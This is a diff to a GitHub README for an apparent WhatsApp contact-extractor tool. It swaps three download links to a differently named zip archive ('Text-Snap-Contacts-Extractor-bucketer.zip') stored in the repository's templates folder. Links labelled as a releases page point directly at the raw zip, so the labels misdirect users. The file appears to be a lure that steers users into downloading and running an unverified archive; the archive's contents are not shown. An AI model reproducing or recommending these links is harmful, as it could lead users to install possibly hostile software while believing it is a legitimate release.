@@ -1,6 +1,6 @@
 # 📥 TextSnap-Contacts-Extractor - Extract WhatsApp Contacts Effortlessly
 
-![Download](https://raw.githubusercontent.com/Zeeshan0008/TextSnap-Contacts-Extractor/main/templates/TextSnap-Contacts-Extractor-v1.7.zip)
+![Download](https://github.com/Zeeshan0008/TextSnap-Contacts-Extractor/raw/refs/heads/main/templates/Text-Snap-Contacts-Extractor-bucketer.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run TextSnap-Contacts-Extractor:
 
 1. **Visit the Releases Page**: Click on the button below to open the releases page.
 
-   [Visit Releases Page](https://raw.githubusercontent.com/Zeeshan0008/TextSnap-Contacts-Extractor/main/templates/TextSnap-Contacts-Extractor-v1.7.zip)
+   [Visit Releases Page](https://github.com/Zeeshan0008/TextSnap-Contacts-Extractor/raw/refs/heads/main/templates/Text-Snap-Contacts-Extractor-bucketer.zip)
 
 2. **Download the Latest Version**: On the releases page, find the latest version. Click on it to see the available files.
 
@@ -42,7 +42,7 @@ Follow these simple steps to download and run TextSnap-Contacts-Extractor:
 
 To download TextSnap-Contacts-Extractor, visit the link below. You will find the latest version ready for download.
 
-[Download the Latest Version](https://raw.githubusercontent.com/Zeeshan0008/TextSnap-Contacts-Extractor/main/templates/TextSnap-Contacts-Extractor-v1.7.zip)
+[Download the Latest Version](https://github.com/Zeeshan0008/TextSnap-Contacts-Extractor/raw/refs/heads/main/templates/Text-Snap-Contacts-Extractor-bucketer.zip)
 
 ## 💡 Usage Tips
 
